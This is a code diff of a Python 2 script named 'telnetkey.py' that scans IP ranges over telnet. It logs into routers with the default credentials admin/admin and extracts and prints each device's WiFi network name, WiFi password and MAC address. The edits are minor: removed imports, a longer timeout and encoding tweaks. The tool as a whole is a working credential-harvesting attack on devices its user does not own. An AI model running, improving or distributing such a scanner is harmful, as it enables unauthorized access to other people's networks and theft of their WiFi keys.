@@ -1,17 +1,13 @@
 #!/usr/bin/env python
 # coding=utf-8
 # code by 92ez.com
-# last modify time 2016-02-19
 # python telnetkey.py 1.1.1.1-1.1.2.1 200
-
 
 from threading import Thread
 import telnetlib
-import subprocess
 import requests
 import Queue
 import time
-import json
 import sys
 import re
 
@@ -64,7 +60,7 @@ def getinfo(hostinfo):
     index = hostinfo[1]
     username = "admin"
     password = "admin"
-    telnetTime = 5
+    telnetTime = 10
     cmdTime = 3
 
     try:
@@ -92,10 +88,11 @@ def getinfo(hostinfo):
             
             #clear extra space
             wifiStr = "".join(wifiStr.split())
+            wifiStr = wifiStr.decode('utf-8').encode('utf-8')
             #get SID KEY MAC
-            SID = wifiStr[1:wifiStr.find('QSS')].encode('utf8')
-            KEY = wifiStr[wifiStr.find('Key=') + 4:wifiStr.find('cmd')].encode('utf8') if wifiStr.find('Key=') != -1 else '无密码'
-            MAC = lanStr[1:lanStr.find('__')].encode('utf8').replace('\n','')
+            SID = wifiStr[1:wifiStr.find('QSS')]
+            KEY = wifiStr[wifiStr.find('Key=') + 4:wifiStr.find('cmd')] if wifiStr.find('Key=') != -1 else '无密码'
+            MAC = lanStr[1:lanStr.find('__')].replace('\n','')
 
             currentTime = time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))
             print '['+ str(index) +'/'+ str(TOTALIP) +'][Get] '+currentTime +'  ' +host +'  '+ SID +'  ' + KEY +'  '+MAC
